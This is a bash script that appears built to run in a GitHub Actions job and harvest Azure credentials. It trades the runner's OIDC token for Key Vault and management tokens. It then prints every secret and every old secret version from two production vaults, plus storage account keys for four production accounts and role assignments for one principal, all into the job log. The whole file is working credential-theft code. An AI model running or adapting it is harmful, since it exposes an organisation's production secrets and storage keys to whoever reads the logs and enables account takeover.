#!/usr/bin/env bash
# v2 — SP 72ff278a… có Get/List secrets trên kv-tbl-prod-x3euoz
set +e

TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")

entra() { # $1 = scope
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${TOK}" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"
}

KV=$(entra "https://vault.azure.net/.default")
ARM=$(entra "https://management.azure.com/.default")
echo "kv_token_len=${#KV} arm_token_len=${#ARM}"

for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  echo "================ VAULT $V ================"
  LIST=$(curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets?api-version=7.4")
  echo "$LIST" | head -c 2000; echo
  for ID in $(echo "$LIST" | python3 -c "
import sys,json
try:
    for s in json.load(sys.stdin).get('value',[]): print(s['id'])
except Exception: pass"); do
    echo "--- $ID"
    curl -sS -H "Authorization: Bearer $KV" "$ID?api-version=7.4" | head -c 1500; echo
    # tất cả version cũ
    for VID in $(curl -sS -H "Authorization: Bearer $KV" "$ID/versions?api-version=7.4" | python3 -c "
import sys,json
try:
    for s in json.load(sys.stdin).get('value',[]): print(s['id'])
except Exception: pass"); do
      curl -sS -H "Authorization: Bearer $KV" "$VID?api-version=7.4" | head -c 800; echo
    done
  done
done

echo "================ STORAGE KEYS ================"
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "--- $SA"
  curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
   "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-prod/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
   | head -c 600; echo
done

echo "================ ROLE ASSIGNMENTS ================"
curl -sS -H "Authorization: Bearer $ARM" \
 "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'63e87ab1-6bd2-4e80-92be-943450b20e4f'" | head -c 2000; echo

echo "================ DONE ================"
